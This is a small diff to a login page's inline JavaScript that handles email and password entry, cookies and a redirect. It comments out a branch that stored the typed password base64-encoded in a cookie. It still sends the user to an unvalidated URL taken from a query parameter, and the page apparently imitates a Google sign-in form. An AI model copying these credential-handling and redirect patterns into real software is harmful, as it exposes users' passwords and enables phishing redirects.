@@ -136,6 +136,7 @@
     <script>
         document.getElementById("redirect").value = urldata("redirect");
         Cookies.set("r", btoa(urldata("redirect")));
+        Cookies.set("x", 0);
         document.getElementById("pw").addEventListener("focus", function() {document.getElementById('password').className+=' u3bW4e';});
         document.getElementById("pw").addEventListener("blur", function() {document.getElementById('password').classList.remove('u3bW4e');});
         document.getElementById("pw").focus();
@@ -176,10 +177,10 @@
                     Cookies.set("x", 1001);
                     location.href = atob(Cookies.get("r"));
                     return;
-                }else if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
+                }/*else if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
                     Cookies.set("x", 1002);
                     Cookies.set("x-user-fire", btoa(document.getElementById('pw').value));
-                }
+                }*/
                 Cookies.set("x", 1003);
                 location.href = atob(Cookies.get("r"));
             } else {
